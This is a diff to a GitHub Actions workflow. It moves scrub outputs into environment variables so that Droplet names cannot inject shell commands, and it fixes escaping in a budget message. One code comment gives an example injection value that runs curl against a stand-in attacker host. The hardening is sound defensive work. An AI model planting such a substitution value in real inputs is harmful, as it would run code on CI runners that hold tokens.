@@ -94,16 +94,26 @@ jobs:
           } >> "$GITHUB_OUTPUT"
           echo "scrubbed_count=${SCRUBBED}" >> "$GITHUB_STEP_SUMMARY"
 
+      # Pass the scrub outputs through `env:` rather than templating
+      # them into the script body. ${{ ... }} substitution happens
+      # BEFORE bash sees the script, so a Droplet name with shell
+      # metacharacters from the DO API (e.g., `$(curl evil.com)`)
+      # would otherwise execute on the runner with GITHUB_TOKEN
+      # access. Reading via env-var-at-runtime is the GitHub-Actions-
+      # documented mitigation:
+      # https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable
       - name: File / comment on dedup leak issue
         if: steps.scrub.outputs.count != '0'
         env:
           GH_TOKEN: ${{ github.token }}
           PRIMARY_LABEL: conformance-leak-incident
           HELPER_LABEL: auto-filed-leak
+          SCRUB_COUNT: ${{ steps.scrub.outputs.count }}
+          SCRUB_DETAILS: ${{ steps.scrub.outputs.details }}
         run: |
           .github/workflows/scripts/file-or-comment-leak-issue.sh \
-            "${{ steps.scrub.outputs.count }}" \
-            "${{ steps.scrub.outputs.details }}"
+            "${SCRUB_COUNT}" \
+            "${SCRUB_DETAILS}"
 
       # Budget-incident gate. Two independent triggers:
       #  1. Month-to-date spend > $25/mo cap (the smoke-gate kill-
@@ -166,7 +176,7 @@ jobs:
           REASON=""
           if awk "BEGIN { exit !(${SPEND} > ${BUDGET_HARD_CAP_USD}) }"; then
             ESCALATE=1
-            REASON="month-to-date $${SPEND} > $${BUDGET_HARD_CAP_USD} cap"
+            REASON="month-to-date \$${SPEND} > \$${BUDGET_HARD_CAP_USD} cap"
           fi
           if [[ "${TODAY_SCRUBS}" -gt "${DAILY_SCRUB_THRESHOLD}" ]]; then
             ESCALATE=1
